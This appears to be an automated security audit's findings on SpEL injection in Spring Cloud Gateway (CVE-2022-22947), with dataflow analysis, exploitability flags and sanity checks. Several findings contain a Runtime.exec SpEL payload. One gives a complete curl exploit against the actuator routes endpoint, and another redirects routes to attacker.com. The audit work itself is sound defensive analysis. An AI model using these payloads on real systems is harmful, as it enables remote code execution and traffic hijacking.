findings.description: SpEL injection via ShortcutConfigurable.getValue() using StandardEvaluationContext - filter/predicate args starting with '#{' are evaluated as full SpEL expressions enabling RCE
findings.code_snippet:
Expression expression = parser.parseExpression(entryValue, new TemplateParserContext());
		value = expression.getValue(context);
findings.reasoning: The getValue() method in ShortcutConfigurable uses a StandardEvaluationContext with full method invocation capability. When a filter/predicate arg value starts with '#{' and ends with '}', it is parsed and evaluated as a SpEL expression. The StandardEvaluationContext (not SimpleEvaluationContext) provides full access to Java reflection and method invocation, enabling arbitrary code execution via expressions like `#{T(java.lang.Runtime).getRuntime().exec('cmd')}`. These arg values flow from RouteDefinition.getFilters()/getPredicates().getArgs(), which can be supplied via the actuator HTTP endpoint POST /routes/{id}.

evidence.dataflow_analysis:
Flow: RouteDefinitionRouteLocator.loadGatewayFilters() -> configurationService.with(factory).properties(definition.getArgs()).bind() -> ConfigurableBuilder.normalizeProperties() -> ShortcutConfigurable.ShortcutType.DEFAULT.normalize() -> getValue(parser, beanFactory, entry.getValue()) -> parser.parseExpression(entryValue, new TemplateParserContext()) -> expression.getValue(context)

The actuator endpoint at AbstractGatewayControllerEndpoint:136 accepts POST /routes/{id} with a RouteDefinition request body. The filter/predicate args from this definition flow through RouteDefinitionRouteLocator.lookup() and loadGatewayFilters() to ConfigurationService, then to ShortcutConfigurable.getValue() which uses StandardEvaluationContext for values starting with #{
evidence.notes: StandardEvaluationContext provides full Java reflection access, allowing T(java.lang.Runtime).getRuntime().exec() calls. The actuator endpoint is a @RestControllerEndpoint which by default requires authentication in Spring Boot Actuator, but may be exposed if security is misconfigured or Spring Security is not on classpath.

exploit_payload.scenario: Attacker POSTs a malicious RouteDefinition with SpEL expression in filter args to the actuator /gateway/routes/{id} endpoint, triggering remote code execution when the route is processed
exploit_payload.prerequisites: Access to the Spring Boot Actuator gateway endpoint (requires actuator to be enabled and exposed, and Spring Security absent or misconfigured)

flags.message: This is a well-known CVE (CVE-2022-22947) in Spring Cloud Gateway - SpEL injection via StandardEvaluationContext
flags.evidence: The code uses StandardEvaluationContext (not SimpleEvaluationContext) which provides full Java reflection access. Values starting with '#{' are treated as SpEL expressions and evaluated with full method invocation capability. This is the exact pattern of CVE-2022-22947 which was a critical RCE vulnerability in Spring Cloud Gateway.

flags.message: Exploitability depends on actuator endpoint exposure and authentication configuration
flags.evidence: The attack vector requires access to the actuator POST /routes/{id} endpoint. In default Spring Boot configurations with Security on classpath, this requires authentication. However, misconfigured or unsecured deployments are fully exploitable for RCE.

sanity_check.reasoning: This is a confirmed true positive vulnerability corresponding to CVE-2022-22947 (CVSS 10.0 critical). The code clearly uses StandardEvaluationContext with full reflection capabilities to evaluate user-controlled SpEL expressions. The dataflow from the actuator endpoint through RouteDefinitionRouteLocator to ShortcutConfigurable.getValue() is accurate and matches the known attack chain. While exploitation requires access to the Gateway actuator API endpoint, in vulnerable configurations this enables remote code execution via expressions like #{T(java.lang.Runtime).getRuntime().exec('cmd')}.

findings.description: SpEL injection in DiscoveryClientRouteDefinitionLocator.getValueFromExpr() - filter/predicate arg values from discovery service metadata are evaluated as SpEL expressions via parser.parseExpression()
findings.reasoning: The getValueFromExpr() method directly calls parser.parseExpression() on the entry value from filter/predicate args that originated from DiscoveryLocatorProperties configuration. While it uses SimpleEvaluationContext (forReadOnlyDataBinding().withInstanceMethods()) which restricts method invocation to instance methods on the root object (ServiceInstance), the fact that ALL values are parsed as SpEL (not just #{} prefixed ones like ShortcutConfigurable.getValue()) means any arg value is treated as a SpEL expression. However, SimpleEvaluationContext limits exploitation - it only allows property access and instance methods on the root object. The SpEL expressions used here can access ServiceInstance properties (serviceId, host, port, metadata) but cannot call arbitrary static methods or T() type references. The source of the arg values is DiscoveryLocatorProperties (application configuration, not direct user HTTP input), but the properties themselves could be controlled via service discovery metadata manipulation. The codeflow shows lines 108/118 as sources - these are from properties.getPredicates().getArgs() and properties.getFilters().getArgs() which come from application config (spring.cloud.gateway.discovery.locator.*), meaning an attacker who can manipulate the application config or service registry metadata could inject SpEL. The SimpleEvaluationContext limits the impact but instance method calls on ServiceInstance (which wraps discovered service metadata from an external registry) remain a partial concern.

evidence.dataflow_analysis:
Flow from lines 108/118: properties.getPredicates().getArgs() and properties.getFilters().getArgs() -> for Map.Entry<String,String> entry -> getValueFromExpr(evalCtxt, parser, instanceForEval, entry) -> parser.parseExpression(entry.getValue()) -> valueExpr.getValue(evalCtxt, instance, String.class)

The SimpleEvaluationContext is constructed as: SimpleEvaluationContext.forReadOnlyDataBinding().withInstanceMethods().build()
This allows instance methods on the root object (ServiceInstance) but NOT static method access (T()) or constructor invocation.
evidence.notes: The use of SimpleEvaluationContext is a partial mitigation. Unlike StandardEvaluationContext, it does not allow T(java.lang.Runtime).getRuntime().exec() style RCE. However, it does allow calling instance methods on the ServiceInstance object, which includes getMetadata() etc. The real concern is that ALL entry values are unconditionally parsed as SpEL, not just #{} prefixed values. Source of the values is from application configuration (DiscoveryLocatorProperties), but these could potentially be injected through a compromised service registry.

exploit_payload.code_snippet:
# An attacker who can control the spring.cloud.gateway.discovery.locator configuration
# or service registry metadata can inject SpEL into filter/predicate args.
# With SimpleEvaluationContext, full RCE is NOT possible, but property access is.
# Example: injecting an expression that evaluates a ServiceInstance property
# spring.cloud.gateway.discovery.locator.predicates[0].args._genkey_0=serviceId
# spring.cloud.gateway.discovery.locator.filters[0].args.name=serviceId
# The expression 'serviceId' would evaluate as a property reference to the ServiceInstance
# For a more impactful scenario with service registry metadata manipulation:
# Register a service with metadata that when evaluated accesses sensitive ServiceInstance data
exploit_payload.scenario: Attacker controlling application configuration or service registry injects SpEL expressions into DiscoveryLocatorProperties predicate/filter args, which are unconditionally evaluated as SpEL against a ServiceInstance with SimpleEvaluationContext
exploit_payload.prerequisites: Ability to modify application configuration properties (spring.cloud.gateway.discovery.locator.predicates/filters) or manipulate the service registry
exploit_payload.category: Expression language injection with limited scope

flags.message: SimpleEvaluationContext significantly restricts SpEL capabilities, limiting exploitability compared to StandardEvaluationContext
flags.evidence: SimpleEvaluationContext.forReadOnlyDataBinding().withInstanceMethods().build() prevents T() operator, constructor invocation, and static method access - the primary vectors for RCE via SpEL injection. The attack surface is limited to read-only operations on ServiceInstance methods.

flags.message: Data source is application configuration (DiscoveryLocatorProperties), not direct user input - requires compromised service registry for injection
flags.evidence: The values come from properties.getPredicates().getArgs() and properties.getFilters().getArgs() which are sourced from DiscoveryLocatorProperties (application config). External exploitation requires either misconfiguration or a compromised service registry metadata injection.

flags.message: Unconditional SpEL parsing of all arg values differs from standard #{} prefix convention used elsewhere in Spring Cloud Gateway
flags.evidence: Unlike ShortcutConfigurable.getValue() which only treats #{} prefixed values as SpEL, this method parses ALL values as SpEL expressions, potentially expanding attack surface if service registry metadata is partially attacker-controlled.

sanity_check.reasoning: The code does contain the described pattern - unconditional SpEL parsing of discovery service configuration values. However, the use of SimpleEvaluationContext substantially mitigates the risk by preventing RCE primitives like Runtime.exec(). The real concern is whether a compromised or malicious service registry could inject SpEL expressions through metadata that then gets evaluated with instance-method access on ServiceInstance objects. This is a legitimate security design concern that warrants human review given the framework/library context, but the immediate exploitability for RCE is much lower than a full StandardEvaluationContext injection.

findings.description: SpEL injection via DiscoveryLocatorProperties.getIncludeExpression() and getUrlExpression() - configuration values are parsed as SpEL and evaluated with SimpleEvaluationContext against ServiceInstance objects
findings.reasoning: The getRouteDefinitions() method parses both the includeExpression and urlExpression configuration properties directly as SpEL expressions. These values come from DiscoveryLocatorProperties (spring.cloud.gateway.discovery.locator.include-expression and url-expression). While they are evaluated using SimpleEvaluationContext (forReadOnlyDataBinding().withInstanceMethods()), which limits the SpEL capabilities, any attacker who can modify the application configuration properties can inject expressions here. Additionally, the urlExpression is evaluated and its result used to create a URI for the route, and includeExpression's result is used as a predicate for service inclusion. The default values 'true' and ''lb://'+serviceId' are safe, but if an attacker can modify these properties (e.g., via Spring Cloud Config, environment variable injection, or management endpoint), they could inject SpEL. The SimpleEvaluationContext limits full RCE but allows access to ServiceInstance instance methods and properties.

evidence.notes: DiscoveryLocatorProperties has default values: includeExpression='true', urlExpression=''lb://'+serviceId'. Both are configurable via spring.cloud.gateway.discovery.locator.* properties. Evaluated with SimpleEvaluationContext.forReadOnlyDataBinding().withInstanceMethods(), which restricts static access but still allows instance method calls on ServiceInstance. The query result at line 83 specifically flags urlExpression which is used to build the URI for the route definition.

exploit_payload.code_snippet:
# Via Spring Cloud Config or environment variable manipulation:
# spring.cloud.gateway.discovery.locator.url-expression=serviceId
# spring.cloud.gateway.discovery.locator.include-expression=serviceId.equals('target-service')
# With SimpleEvaluationContext, attacker can access all ServiceInstance properties/methods
# The most impactful scenario: manipulate urlExpression to redirect traffic
# spring.cloud.gateway.discovery.locator.url-expression="'http://attacker.com/'"+serviceId
exploit_payload.scenario: Attacker who can modify application configuration properties (e.g., via Spring Cloud Config) injects SpEL expressions into includeExpression or urlExpression, potentially hijacking service routing
exploit_payload.prerequisites: Ability to modify spring.cloud.gateway.discovery.locator configuration properties (e.g., via Spring Cloud Config Server, environment injection)
exploit_payload.category: Expression language injection leading to route hijacking

flags.message: Exploitability depends on who controls the configuration properties
flags.evidence: The SpEL expressions come from DiscoveryLocatorProperties (spring.cloud.gateway.discovery.locator.include-expression and url-expression). These are application configuration values typically set by the application operator, not external users. For this to be exploitable, an attacker would need write access to the application configuration (e.g., Spring Cloud Config Server, environment variables, or config files). If configuration is externalized and writable by lower-privileged parties, this is a real risk.

flags.message: SimpleEvaluationContext significantly limits SpEL injection impact
flags.evidence: The code uses SimpleEvaluationContext.forReadOnlyDataBinding().withInstanceMethods().build(), which prevents access to static methods, reflection-based attacks, and Java class manipulation. This reduces the severity compared to full SpEL evaluation contexts, though instance method chaining on ServiceInstance objects could still be abused.

flags.message: Configuration injection pattern in Spring Cloud Gateway discovery locator
flags.evidence: This is a known pattern in Spring Cloud Gateway where configuration properties are treated as SpEL expressions. The risk materializes primarily in multi-tenant or cloud-native environments where configuration can be modified by less-trusted principals (e.g., via Config Server with insufficient access controls).

sanity_check.reasoning: The code genuinely parses configuration properties as SpEL expressions (no hallucination), and the vulnerability is real in contexts where configuration can be modified by attackers (e.g., compromised Config Server, misconfigured cloud environment). However, the use of SimpleEvaluationContext limits the blast radius, and in typical deployments, configuration properties are controlled by trusted operators. This is a legitimate security concern for frameworks/libraries that should be reviewed by a human expert to assess the deployment context and trust boundaries around configuration management.

findings.description: Spring Cloud Gateway Actuator endpoint accepts RouteDefinition via HTTP POST with filter/predicate args that flow to SpEL evaluation with StandardEvaluationContext, enabling remote code execution (CVE-2022-22947 pattern)
findings.reasoning: This is the actuator endpoint entry point for the critical SpEL injection vulnerability. The @PostMapping("/routes/{id}") method accepts a RouteDefinition from the HTTP request body. The RouteDefinition contains predicates and filters, each with an args Map<String,String>. When the gateway processes these routes (via RouteDefinitionRouteLocator.lookup() and loadGatewayFilters()), the args are passed through ConfigurationService -> ShortcutConfigurable.getValue() which evaluates any value starting with '#{' as a SpEL expression using StandardEvaluationContext. The StandardEvaluationContext provides full Java reflection access enabling T(java.lang.Runtime).getRuntime().exec() style RCE. The validateRouteDefinition() only checks if filter/predicate names are available (registered in the application context), not the content of their args. This is the well-known CVE-2022-22947 vulnerability in Spring Cloud Gateway.

evidence.dataflow_analysis: HTTP POST /actuator/gateway/routes/{id} -> RouteDefinition.getFilters()/getPredicates().getArgs() -> RouteDefinitionRouteLocator.loadGatewayFilters()/lookup() -> configurationService.with(factory).properties(definition.getArgs()).bind() -> ConfigurableBuilder.normalizeProperties() -> ShortcutConfigurable.ShortcutType.DEFAULT.normalize() -> getValue(parser, beanFactory, entry.getValue()) -> parser.parseExpression(entryValue, new TemplateParserContext()) -> expression.getValue(StandardEvaluationContext)
evidence.notes: This is the exact same pattern as CVE-2022-22947 (CVSS 10.0). The actuator endpoint is a @RestControllerEndpoint which is exposed via Spring Boot Actuator. By default, Spring Boot Actuator exposes some endpoints without authentication. The GatewayControllerEndpoint is annotated with @RestControllerEndpoint(id='gateway').

exploit_payload.scenario: Unauthenticated (or low-privilege) attacker POSTs a malicious RouteDefinition with SpEL expression '#{T(java.lang.Runtime).getRuntime().exec("id")}' in a filter arg value to the actuator endpoint, then triggers route refresh to cause remote code execution on the server
exploit_payload.prerequisites: The Spring Boot Actuator gateway endpoint must be enabled and exposed (management.endpoints.web.exposure.include=gateway or *), Spring Security either absent or the endpoint accessible

flags.evidence: The code shows the exact entry point for the SpEL injection vulnerability in Spring Cloud Gateway. The validateRouteDefinition method only checks filter/predicate names, not argument values, allowing malicious SpEL expressions to pass through to StandardEvaluationContext evaluation.

sanity_check.reasoning: This is a confirmed true positive representing CVE-2022-22947 (CVSS 10.0). The @PostMapping('/routes/{id}') endpoint accepts a RouteDefinition with filter/predicate args, and the validateRouteDefinition method only validates names (not values), allowing SpEL expressions like #{...} to flow through to ShortcutConfigurable.getValue() which evaluates them using StandardEvaluationContext with a BeanFactoryResolver, enabling full RCE. The dataflow analysis is accurate and the code snippet exactly matches the described vulnerability pattern. This is production runtime code in the Spring Cloud Gateway framework.

findings.description: SpEL injection in DiscoveryClientRouteDefinitionLocator.getRouteDefinitions() - filter and predicate args from DiscoveryLocatorProperties are unconditionally evaluated as SpEL via getValueFromExpr() against discovered service instances
findings.reasoning: Both the predicate args (line 109) and filter args (line 119) from DiscoveryLocatorProperties are iterated and each entry value is passed to getValueFromExpr() which unconditionally calls parser.parseExpression(entry.getValue()). This means ALL arg values from the discovery locator configuration are treated as SpEL expressions. While the evaluation uses SimpleEvaluationContext (which restricts static method calls), any malicious SpEL expression that works within the constraints of SimpleEvaluationContext can be injected if an attacker can modify the discovery locator properties. The route definition codeflows (lines 108/118 as sources flowing to line 143 at the sink) confirm this path. The SimpleEvaluationContext allows instance method calls on ServiceInstance, meaning metadata from the service registry (which could be attacker-controlled in a compromised environment) influences the evaluation context.

evidence.dataflow_analysis: Source at lines 108/118: original.getArgs().entrySet() where original comes from this.properties.getPredicates() and this.properties.getFilters(). These are DiscoveryLocatorProperties configured via spring.cloud.gateway.discovery.locator.predicates[*].args and filters[*].args. Flow goes to getValueFromExpr() -> parser.parseExpression(entry.getValue()) -> valueExpr.getValue(evalCtxt, instance, String.class). The evalCtxt is SimpleEvaluationContext.forReadOnlyDataBinding().withInstanceMethods().
evidence.notes: The codeflow from Query 3 and 5 confirms this path. The evalCtxt uses SimpleEvaluationContext which is a partial mitigation, but the unconditional parsing of ALL values as SpEL (unlike ShortcutConfigurable which only parses #{} prefixed values) is the key concern.

exploit_payload.code_snippet:
# Via application.yml or Spring Cloud Config:
# spring:
#   cloud:
#     gateway:
#       discovery:
#         locator:
#           enabled: true
#           predicates:
#             - name: Path
#               args:
#                 pattern: "'/'+serviceId+'/**'"
#           filters:
#             - name: RewritePath
#               args:
#                 regexp: "'/'+serviceId+'/(?<remaining>.*)'"
#                 replacement: "'/${remaining}'"
# The arg values are evaluated as SpEL against ServiceInstance context.
# An attacker controlling config can inject:
#   args:
#     pattern: "serviceId" # accesses ServiceInstance.getServiceId() property
exploit_payload.scenario: Attacker who controls application configuration or Spring Cloud Config injects SpEL expressions into discovery locator predicate/filter args, which are evaluated against ServiceInstance objects from the service registry
exploit_payload.prerequisites: Ability to modify spring.cloud.gateway.discovery.locator.predicates or filters configuration, and the discovery locator feature must be enabled

flags.message: Vulnerability exploitability depends on trust model of DiscoveryLocatorProperties configuration source
flags.evidence: The properties come from spring.cloud.gateway.discovery.locator.predicates[*].args and filters[*].args - these are application configuration properties typically controlled by operators, not external users. If an attacker can influence these configuration values (e.g., via a compromised config server, environment variables, or properties files), SpEL injection is possible.

flags.message: SimpleEvaluationContext partially mitigates SpEL injection severity
flags.evidence: The evalCtxt uses SimpleEvaluationContext.forReadOnlyDataBinding().withInstanceMethods() which restricts access to static methods, constructors, and most dangerous SpEL features. This significantly limits what an attacker can do compared to a StandardEvaluationContext, but data exfiltration and DoS via the instance object's exposed properties may still be possible.

flags.message: This pattern is the intended design for Spring Cloud Gateway discovery route configuration but lacks input sanitization guards
flags.evidence: The getValueFromExpr() method unconditionally evaluates all arg values as SpEL, unlike ShortcutConfigurable which only evaluates #{} prefixed values. This design decision makes SpEL evaluation implicit and potentially unexpected for all config values.

sanity_check.reasoning: The code does contain a genuine SpEL evaluation pattern where all predicate and filter arg values from DiscoveryLocatorProperties are unconditionally evaluated as SpEL expressions via getValueFromExpr(). The use of SimpleEvaluationContext provides a meaningful mitigation but doesn't fully eliminate injection risk. The primary concern for exploitability is whether an attacker can influence the DiscoveryLocatorProperties configuration values - this is most plausible in scenarios involving a compromised or malicious config server, making this a real but context-dependent vulnerability that warrants manual security review.

findings.description: GatewayLegacyControllerEndpoint inherits vulnerable save() endpoint from AbstractGatewayControllerEndpoint - same SpEL injection via actuator POST /routes/{id} as parent class
findings.reasoning: GatewayLegacyControllerEndpoint is annotated with @RestControllerEndpoint(id = "gateway") and extends AbstractGatewayControllerEndpoint. It inherits the save() method at line 136 of AbstractGatewayControllerEndpoint which accepts POST /routes/{id} with a RouteDefinition body. This means the legacy endpoint also exposes the same SpEL injection vulnerability. The legacy endpoint uses the same actuator ID "gateway", so any actuator exposure configuration that enables the gateway endpoint would also expose this endpoint. Since both GatewayControllerEndpoint and GatewayLegacyControllerEndpoint have the same @RestControllerEndpoint(id = "gateway") annotation, only one will be active at a time based on configuration, but both are vulnerable entry points.

evidence.notes: Both GatewayControllerEndpoint and GatewayLegacyControllerEndpoint extend AbstractGatewayControllerEndpoint and both are annotated @RestControllerEndpoint(id = 'gateway'). The inherited save() method at AbstractGatewayControllerEndpoint:136 accepts RouteDefinition from HTTP request body. Filter/predicate args with #{...} values are evaluated as SpEL with StandardEvaluationContext in ShortcutConfigurable.getValue().

exploit_payload.code_snippet:
# Same exploit as AbstractGatewayControllerEndpoint - same inherited endpoint
curl -X POST 'http://target:8080/actuator/gateway/routes/rce' \
  -H 'Content-Type: application/json' \
  -d '{"id":"rce","filters":[{"name":"AddResponseHeader","args":{"name":"X-foo","value":"#{T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"id\"})}}"]}],"uri":"http://example.com","predicates":[{"name":"Path","args":{"pattern":"/rce/**"}}]}'
exploit_payload.scenario: Same as AbstractGatewayControllerEndpoint - attacker POSTs malicious RouteDefinition with SpEL in filter args through the legacy gateway actuator endpoint inherited from AbstractGatewayControllerEndpoint
exploit_payload.prerequisites: Spring Boot Actuator gateway endpoint enabled and accessible, Spring Security absent or misconfigured

flags.message: Exploitation requires actuator endpoint to be exposed and accessible
flags.evidence: Spring Boot actuator endpoints are not exposed by default over HTTP. The gateway actuator endpoint must be explicitly configured via management.endpoints.web.exposure.include=gateway or similar. Additionally, proper authentication/authorization should protect actuator endpoints in production deployments.

flags.message: Finding targets the legacy controller endpoint specifically as a separate attack surface from the main GatewayControllerEndpoint
flags.evidence: Both GatewayLegacyControllerEndpoint and GatewayControllerEndpoint use @RestControllerEndpoint(id = 'gateway') and extend AbstractGatewayControllerEndpoint, meaning both inherit the same save() method. The legacy endpoint is a distinct class that independently exposes the vulnerability.

sanity_check.reasoning: The finding is legitimate: GatewayLegacyControllerEndpoint extends AbstractGatewayControllerEndpoint and inherits the save() POST /routes/{id} endpoint which is susceptible to SpEL injection via RouteDefinition filter/predicate args being evaluated with StandardEvaluationContext. The code snippet confirms the class declaration and inheritance relationship. However, exploitation requires the actuator endpoint to be explicitly exposed and accessible (not the default), which reduces real-world risk somewhat. This is consistent with CVE-2022-22947 and related Spring Cloud Gateway SpEL injection vulnerabilities, and the legacy endpoint represents a genuine secondary attack surface if not properly secured.
